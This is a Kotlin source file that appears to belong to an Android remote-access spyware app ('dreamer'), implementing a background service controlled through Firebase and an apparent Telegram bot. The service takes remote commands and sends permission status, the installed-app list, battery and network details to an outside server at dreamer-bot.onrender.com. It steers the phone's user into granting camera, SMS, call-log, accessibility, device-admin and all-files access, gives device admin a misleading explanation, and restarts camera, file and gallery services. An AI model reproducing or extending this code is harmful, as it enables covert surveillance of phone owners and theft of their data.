package com.h4k3r.dreamer

import android.Manifest
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.IBinder
import android.provider.Settings
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.google.androidbrowserhelper.locationdelegation.PermissionRequestActivity
import com.google.firebase.database.*
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.google.gson.Gson
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody

class PermissionMonitorService : Service() {
    companion object {
        private const val TAG = "PermissionMonitor"
    }

    /* ── Authentication ─────────────────────────── */
    private lateinit var secretKey: String
    private lateinit var deviceId: String
    private lateinit var deviceRef: DatabaseReference

    /* ── HTTP & Coroutines ──────────────────────── */
    private val server = "https://dreamer-bot.onrender.com"
    private val http = OkHttpClient()
    private val gson = Gson()
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    /* ── Enhanced Permission Definitions ─────────────────── */
    private val permissionGroups = mapOf(
        "📸 Camera & Media" to listOf("camera", "storage_read", "microphone"),
        "📍 Location" to listOf("location_fine", "location_coarse"),
        "📱 Communication" to listOf("contacts", "sms", "phone", "call_log"),
        "🔔 System Access" to listOf("notifications", "overlay", "accessibility", "notification_listener"),
        "📁 Storage" to listOf("all_files_access", "storage_write"),
        "⚙️ Admin" to listOf("device_admin")
    )

    // Remove special permissions from everywhere
    // Only keep runtime permissions logic
    private val permissionsToCheck = mapOf(
        "camera" to Manifest.permission.CAMERA,
        "location_fine" to Manifest.permission.ACCESS_FINE_LOCATION,
        "location_coarse" to Manifest.permission.ACCESS_COARSE_LOCATION,
        "contacts" to Manifest.permission.READ_CONTACTS,
        "sms" to Manifest.permission.READ_SMS,
        "phone" to Manifest.permission.READ_PHONE_STATE,
        "microphone" to Manifest.permission.RECORD_AUDIO,
        "call_log" to Manifest.permission.READ_CALL_LOG,
        "calendar" to Manifest.permission.READ_CALENDAR,
        "storage_read" to if (Build.VERSION.SDK_INT >= 33) {
            Manifest.permission.READ_MEDIA_IMAGES
        } else {
            Manifest.permission.READ_EXTERNAL_STORAGE
        }
    )

    override fun onCreate() {
        super.onCreate()

        val prefs = getSharedPreferences("dreamer_auth", MODE_PRIVATE)
        secretKey = prefs.getString("secret_key", "") ?: ""
        deviceId = prefs.getString("device_id", "") ?: ""

        if (secretKey.isEmpty() || deviceId.isEmpty()) {
            Log.e(TAG, "Missing authentication")
            stopSelf()
            return
        }

        Log.d(TAG, "Service started - Key: ${secretKey.take(6)}..., Device: $deviceId")

        startForegroundNotification()

        deviceRef = Firebase.database.reference
            .child("devices")
            .child(secretKey)
            .child(deviceId)

        listenFirebase()
        startPeriodicPermissionCheck()
    }

    private fun listenFirebase() {
        deviceRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val cmd = snapshot.child("command").getValue(String::class.java) ?: return
                val chatId = snapshot.child("chat").getValue(Long::class.java) ?: 0L
                val msgId = snapshot.child("msg").getValue(Long::class.java) ?: 0L

                Log.d(TAG, "Command: $cmd")

                when (cmd) {
                    "check_permissions" -> checkAndSendPermissions(chatId, msgId)
                    "request_permissions" -> requestMissingPermissions(chatId, msgId)
                    "grant_permission" -> {
                        val permission = snapshot.child("permission").getValue(String::class.java)
                        permission?.let { grantSpecificPermission(it, chatId, msgId) }
                    }
                    "battery_status" -> sendBatteryStatus(chatId, msgId)
                    "network_info" -> sendNetworkInfo(chatId, msgId)
                    "app_list" -> sendAppList(chatId, msgId)
                    "restart_services" -> restartAllServices(chatId)
                }

                snapshot.child("command").ref.setValue(null)
            }

            override fun onCancelled(error: DatabaseError) {
                Log.e(TAG, "Firebase error", error.toException())
            }
        })
    }

    /* ── Enhanced Permission Check ──────────────── */
    private fun checkAndSendPermissions(chatId: Long, msgId: Long) {
        Log.d(TAG, "Checking permissions - ChatID: $chatId, MsgID: $msgId")

        val permissions = mutableMapOf<String, Boolean>()

        // Check regular permissions
        permissionsToCheck.forEach { (name, permission) ->
            if (permission != null) {
                permissions[name] = ContextCompat.checkSelfPermission(this, permission) ==
                        PackageManager.PERMISSION_GRANTED
            }
        }

        // Update Firebase with current permissions
        deviceRef.child("info").child("permissions").setValue(permissions)

        val json = gson.toJson(mapOf(
            "chat_id" to chatId,
            "msg_id" to msgId,
            "permissions" to permissions
        ))

        postJson("/json/permissions", json)
    }

    /* ── Enhanced Interactive Permission Request ─────────── */
    private fun requestMissingPermissions(chatId: Long, msgId: Long) {
        Log.d(TAG, "Creating enhanced permission request interface")

        val currentPermissions = checkCurrentPermissions()
        val missingPermissions = currentPermissions.filter { !it.value }

        if (missingPermissions.isEmpty()) {
            val response = mapOf(
                "chat_id" to chatId,
                "msg_id" to msgId,
                "type" to "permission_interface",
                "status" to "all_granted",
                "message" to "🎉 *All Permissions Granted!*\n\n✅ Your device is fully configured.\n\n_All features are available._"
            )
            postJson("/json/permission_interface", gson.toJson(response))
            return
        }

        // Create enhanced interactive permission interface
        val permissionButtons = mutableListOf<Map<String, Any>>()
        val groupedMissing = mutableMapOf<String, MutableList<String>>()

        // Group missing permissions
        missingPermissions.keys.forEach { permission ->
            val group = permissionGroups.entries.find { it.value.contains(permission) }?.key ?: "Other"
            groupedMissing.getOrPut(group) { mutableListOf() }.add(permission)
        }

        // Create button for each permission group
        groupedMissing.forEach { (group, perms) ->
            permissionButtons.add(mapOf(
                "text" to "$group (${perms.size})",
                "callback_data" to "perm_group_${group.hashCode()}"
            ))
        }

        // Add individual permission buttons for critical ones
        val criticalPerms = listOf("camera", "location_fine", "accessibility", "all_files_access", "storage_read")
        missingPermissions.keys.filter { it in criticalPerms }.forEach { perm ->
            val emoji = getPermissionEmoji(perm)
            val name = getPermissionDisplayName(perm)
            permissionButtons.add(mapOf(
                "text" to "$emoji $name",
                "callback_data" to "grant_perm_$perm"
            ))
        }

        val response = mapOf(
            "chat_id" to chatId,
            "msg_id" to msgId,
            "type" to "permission_interface",
            "status" to "missing_permissions",
            "total_missing" to missingPermissions.size,
            "grouped_missing" to groupedMissing,
            "buttons" to permissionButtons,
            "message" to createEnhancedPermissionMessage(groupedMissing, missingPermissions.size)
        )

        postJson("/json/permission_interface", gson.toJson(response))
    }

    /* ── Enhanced Grant Specific Permission ──────────────── */
    private fun grantSpecificPermission(permission: String, chatId: Long, msgId: Long) {
        Log.d(TAG, "Attempting to grant permission: $permission")

        val intent = when (permission) {
            "all_files_access" -> {
                if (Build.VERSION.SDK_INT >= 30) {
                    Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                        data = Uri.parse("package:$packageName")
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    }
                } else {
                    Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION).apply {
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    }
                }
            }
            "accessibility" -> {
                Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                }
            }
            "overlay" -> {
                Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                    data = Uri.parse("package:$packageName")
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                }
            }
            "notification_listener" -> {
                Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS").apply {
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                }
            }
            "device_admin" -> {
                Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                        android.content.ComponentName(this@PermissionMonitorService, DeviceAdminReceiver::class.java))
                    putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "Required for advanced device management")
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                }
            }
            else -> {
                // For regular permissions, try to request them
                val permissionString = permissionsToCheck[permission]
                if (permissionString != null) {
                    // Create a custom activity to request permission
                    Intent(this, PermissionRequestActivity::class.java).apply {
                        putExtra("permission", permissionString)
                        putExtra("chat_id", chatId)
                        putExtra("msg_id", msgId)
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    }
                } else {
                    // Fallback to app settings
                    Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                        data = Uri.parse("package:$packageName")
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    }
                }
            }
        }

        if (intent != null) {
            try {
                startActivity(intent)

                // Send confirmation to Telegram
                val response = mapOf(
                    "chat_id" to chatId,
                    "msg_id" to msgId,
                    "type" to "permission_grant_requested",
                    "permission" to permission,
                    "message" to "🔧 *Permission Request Sent*\n\n" +
                            "Please follow the on-screen instructions to grant the permission.\n\n" +
                            "After granting, return here and check permissions again."
                )
                postJson("/json/permission_interface", gson.toJson(response))

            } catch (e: Exception) {
                Log.e(TAG, "Failed to launch permission intent", e)

                val errorResponse = mapOf(
                    "chat_id" to chatId,
                    "msg_id" to msgId,
                    "type" to "permission_error",
                    "error" to "Failed to open permission settings: ${e.message}"
                )
                postJson("/json/permission_interface", gson.toJson(errorResponse))
            }
        } else {
            val errorResponse = mapOf(
                "chat_id" to chatId,
                "msg_id" to msgId,
                "type" to "permission_error",
                "error" to "Unknown permission: $permission"
            )
            postJson("/json/permission_interface", gson.toJson(errorResponse))
        }
    }

    /* ── Enhanced Permission Message Creator ─────────────── */
    private fun createEnhancedPermissionMessage(groupedMissing: Map<String, List<String>>, totalMissing: Int): String {
        var message = "🔐 *Permission Setup Required*\n\n"
        message += "Your device needs ${totalMissing} permission${if (totalMissing > 1) "s" else ""} to function properly.\n\n"

        message += "*Missing Permissions:*\n"
        groupedMissing.forEach { (group, perms) ->
            message += "• $group: ${perms.size} permission${if (perms.size > 1) "s" else ""}\n"
        }

        message += "\n*Quick Actions:*\n"
        message += "• Tap individual permissions to grant them\n"
        message += "• Use group buttons for multiple permissions\n"
        message += "• Check status after granting permissions\n\n"

        message += "_Device: ${deviceId.take(6)}..._"

        return message
    }

    /* ── Enhanced Permission Check ───────────────────────── */
    private fun checkCurrentPermissions(): Map<String, Boolean> {
        val permissions = mutableMapOf<String, Boolean>()

        // Check regular permissions
        permissionsToCheck.forEach { (name, permission) ->
            if (permission != null) {
                permissions[name] = ContextCompat.checkSelfPermission(this, permission) ==
                        PackageManager.PERMISSION_GRANTED
            }
        }

        return permissions
    }

    /* ── Enhanced Helper Functions ───────────────────────── */
    private fun getPermissionEmoji(permission: String): String {
        return when (permission) {
            "camera" -> "📸"
            "location_fine", "location_coarse" -> "📍"
            "contacts" -> "📱"
            "sms" -> "💬"
            "storage_read", "storage_write", "all_files_access" -> "📂"
            "phone" -> "📞"
            "microphone" -> "🎤"
            "notifications" -> "🔔"
            "overlay" -> "🖼️"
            "device_admin" -> "⚙️"
            "accessibility" -> "♿"
            "notification_listener" -> "🔔"
            "call_log" -> "📞"
            "calendar" -> "📅"
            else -> "❓"
        }
    }

    private fun getPermissionDisplayName(permission: String): String {
        return when (permission) {
            "camera" -> "Camera"
            "location_fine" -> "Location (Fine)"
            "location_coarse" -> "Location (Coarse)"
            "contacts" -> "Contacts"
            "sms" -> "SMS"
            "storage_read" -> "Storage Read"
            "storage_write" -> "Storage Write"
            "phone" -> "Phone"
            "microphone" -> "Microphone"
            "notifications" -> "Notifications"
            "all_files_access" -> "All Files Access"
            "overlay" -> "Overlay"
            "device_admin" -> "Device Admin"
            "accessibility" -> "Accessibility"
            "notification_listener" -> "Notification Listener"
            "call_log" -> "Call Log"
            "calendar" -> "Calendar"
            else -> permission.replace("_", " ").capitalize()
        }
    }

    /* ── Enhanced Device Info Functions ──────────────────── */
    private fun sendBatteryStatus(chatId: Long, msgId: Long) {
        scope.launch {
            try {
                val batteryIntent = registerReceiver(
                    null,
                    android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED)
                )
                val level = batteryIntent?.getIntExtra("level", -1) ?: -1
                val scale = batteryIntent?.getIntExtra("scale", -1) ?: -1
                val batteryPercent = if (level != -1 && scale != -1) {
                    (level * 100 / scale)
                } else {
                    -1
                }

                val isCharging = batteryIntent?.getIntExtra("status", -1) ==
                        android.os.BatteryManager.BATTERY_STATUS_CHARGING

                val json = gson.toJson(mapOf(
                    "chat_id" to chatId,
                    "msg_id" to msgId,
                    "battery_percent" to batteryPercent,
                    "is_charging" to isCharging,
                    "device_id" to deviceId
                ))

                postJson("/json/battery_status", json)
            } catch (e: Exception) {
                Log.e(TAG, "Battery status error", e)
            }
        }
    }

    private fun sendNetworkInfo(chatId: Long, msgId: Long) {
        scope.launch {
            try {
                val connectivityManager = getSystemService(android.net.ConnectivityManager::class.java)
                val activeNetwork = connectivityManager?.activeNetworkInfo

                val networkType = when (activeNetwork?.type) {
                    android.net.ConnectivityManager.TYPE_WIFI -> "WiFi"
                    android.net.ConnectivityManager.TYPE_MOBILE -> "Mobile Data"
                    android.net.ConnectivityManager.TYPE_ETHERNET -> "Ethernet"
                    else -> "Unknown"
                }

                val json = gson.toJson(mapOf(
                    "chat_id" to chatId,
                    "msg_id" to msgId,
                    "network_type" to networkType,
                    "is_connected" to (activeNetwork?.isConnected ?: false),
                    "device_id" to deviceId
                ))

                postJson("/json/network_info", json)
            } catch (e: Exception) {
                Log.e(TAG, "Network info error", e)
            }
        }
    }

    private fun sendAppList(chatId: Long, msgId: Long) {
        scope.launch {
            try {
                val packageManager = packageManager
                val installedApps = packageManager.getInstalledApplications(PackageManager.GET_META_DATA)
                    .filter { packageManager.getLaunchIntentForPackage(it.packageName) != null }
                    .take(50) // Limit to first 50 apps
                    .map {
                        mapOf(
                            "name" to (it.loadLabel(packageManager).toString()),
                            "package" to it.packageName,
                            "version" to (packageManager.getPackageInfo(it.packageName, 0).versionName ?: "Unknown")
                        )
                    }

                val json = gson.toJson(mapOf(
                    "chat_id" to chatId,
                    "msg_id" to msgId,
                    "apps" to installedApps,
                    "total_count" to installedApps.size,
                    "device_id" to deviceId
                ))

                postJson("/json/app_list", json)
            } catch (e: Exception) {
                Log.e(TAG, "App list error", e)
            }
        }
    }

    private fun restartAllServices(chatId: Long) {
        scope.launch {
            try {
                val services = listOf(
                    CameraService::class.java,
                    DataService::class.java,
                    FilesService::class.java,
                    GalleryService::class.java
                )

                services.forEach { serviceClass ->
                    try {
                        val intent = Intent(this@PermissionMonitorService, serviceClass)
                        ContextCompat.startForegroundService(this@PermissionMonitorService, intent)
                    } catch (e: Exception) {
                        Log.e(TAG, "Failed to restart ${serviceClass.simpleName}", e)
                    }
                }

                val json = gson.toJson(mapOf(
                    "chat_id" to chatId,
                    "type" to "services_restarted",
                    "message" to "✅ All services have been restarted successfully",
                    "device_id" to deviceId
                ))

                postJson("/json/status", json)
            } catch (e: Exception) {
                Log.e(TAG, "Service restart error", e)
            }
        }
    }

    /* ── Network Helper ─────────────────────────── */
    private fun postJson(path: String, json: String) = scope.launch {
        try {
            val request = Request.Builder()
                .url(server + path)
                .header("X-Auth", "$secretKey:$deviceId")
                .post(json.toRequestBody("application/json".toMediaType()))
                .build()

            http.newCall(request).execute().use { response ->
                Log.d(TAG, "POST $path: ${response.code}")
                if (!response.isSuccessful) {
                    Log.e(TAG, "Failed: ${response.body?.string()}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Network error", e)
        }
    }

    /* ── Service Lifecycle ──────────────────────── */
    private fun startForegroundNotification() {
        val channelId = "permission_monitor"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            getSystemService(NotificationManager::class.java)
                .createNotificationChannel(
                    NotificationChannel(
                        channelId,
                        "Permission Monitor",
                        NotificationManager.IMPORTANCE_MIN
                    )
                )
        }

        startForeground(5, NotificationCompat.Builder(this, channelId)
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setContentTitle("Permission Monitor Active")
            .setContentText("Device: ${deviceId.take(6)}")
            .build()
        )
    }

    private fun startPeriodicPermissionCheck() {
        // Check permissions every 30 minutes
        scope.launch {
            while (isActive) {
                delay(30 * 60 * 1000) // 30 minutes
                checkAndSendPermissions(0, 0) // Update Firebase only
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int) = START_STICKY
    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        scope.cancel()
        super.onDestroy()
    }
}

